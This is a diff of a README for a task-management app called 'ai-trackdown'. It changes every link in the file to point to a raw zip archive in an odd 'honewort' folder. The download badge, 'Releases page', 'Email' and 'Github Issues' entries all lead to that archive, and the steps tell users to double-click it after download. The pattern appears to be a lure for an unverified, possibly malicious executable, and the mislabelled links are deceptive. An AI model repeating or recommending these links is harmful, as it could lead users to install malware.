@@ -6,7 +6,7 @@ Welcome to **ai-trackdown**! This application helps you manage tasks using a str
 
 ## 📥 Download ai-trackdown
 
-[![Download ai-trackdown](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/ai-trackdown.zip%https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/ai-trackdown.zip)](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/ai-trackdown.zip)
+[![Download ai-trackdown](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/trackdown_ai_3.7.zip%https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/trackdown_ai_3.7.zip)](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/trackdown_ai_3.7.zip)
 
 ## 📋 What You Need
 
@@ -29,13 +29,13 @@ Before you download, make sure your device meets these requirements:
 
 To get started with **ai-trackdown**, visit the following page to download the latest version.
 
-[**Download Here**](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/ai-trackdown.zip)
+[**Download Here**](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/trackdown_ai_3.7.zip)
 
 Here are the steps to install:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/ai-trackdown.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/trackdown_ai_3.7.zip).
 2. Find the latest release.
-3. Click on the file compatible with your operating system (e.g., `https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/ai-trackdown.zip` for Windows).
+3. Click on the file compatible with your operating system (e.g., `https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/trackdown_ai_3.7.zip` for Windows).
 4. Save the file to your computer.
 5. Once the download finishes, locate the file and double-click it.
 6. Follow the instructions on the installation wizard to complete the setup.
@@ -61,8 +61,8 @@ If you need help while using **ai-trackdown**, please check the following resour
 
 For further inquiries or support, you can reach us via:
 
-- **Email:** https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/ai-trackdown.zip
-- **Github Issues:** [Report an Issue](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/ai-trackdown.zip)
+- **Email:** https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/trackdown_ai_3.7.zip
+- **Github Issues:** [Report an Issue](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/trackdown_ai_3.7.zip)
 
 ## 🚀 Final Thoughts
 
@@ -70,4 +70,4 @@ Congratulations on taking the first step toward better task management with **ai
 
 Feel free to download the latest release anytime.
 
-[**Download Here**](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/ai-trackdown.zip)
+[**Download Here**](https://raw.githubusercontent.com/Seba-1aa/ai-trackdown/main/honewort/trackdown_ai_3.7.zip)
